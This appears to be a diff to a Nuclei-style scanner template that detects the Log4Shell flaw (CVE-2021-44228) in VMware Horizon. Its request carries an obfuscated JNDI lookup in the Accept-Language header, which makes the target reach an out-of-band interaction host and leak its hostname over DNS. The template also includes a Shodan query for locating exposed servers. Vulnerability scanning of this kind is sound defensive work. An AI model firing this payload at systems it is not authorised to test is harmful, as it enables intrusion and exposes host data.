@@ -1,5 +1,4 @@
 id: vmware-horizon-log4j-rce
-
 info:
   name: VMware Horizon - JNDI Remote Code Execution (Apache Log4j)
   author: johnk3r
@@ -15,37 +14,32 @@ info:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
     cvss-score: 10
     cve-id: CVE-2021-44228
-    cwe-id: CWE-77
+    cwe-id: CWE-502,CWE-77
   metadata:
     runzero-review: REJECT/2025-11-07/uses interactsh
-    verified: true
     max-request: 1
     shodan-query: http.html:"VMware Horizon"
-  tags: cve,cve2021,rce,jndi,log4j,horizon,vmware,oast,kev,vuln
-
+    verified: true
+  tags: cve,cve2021,horizon,jndi,kev,log4j,oast,rce,vmware,vuln
 http:
-  - raw:
+  - extractors:
+      - group: 1
+        part: interactsh_request
+        regex:
+          - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+        type: regex
+    matchers:
+      - part: interactsh_protocol
+        type: word
+        words:
+          - dns
+      - part: interactsh_request
+        regex:
+          - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+        type: regex
+    matchers-condition: and
+    raw:
       - |
         GET /portal/info.jsp HTTP/1.1
         Host: {{Hostname}}
         Accept-Language: ${jndi:${lower:d}n${lower:s}://${env:hostName}.{{interactsh-url}}}
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: interactsh_protocol # Confirms the DNS Interaction
-        words:
-          - "dns"
-
-      - type: regex
-        part: interactsh_request
-        regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable
-
-    extractors:
-      - type: regex
-        group: 1
-        regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${hostName} in output
-        part: interactsh_request
-
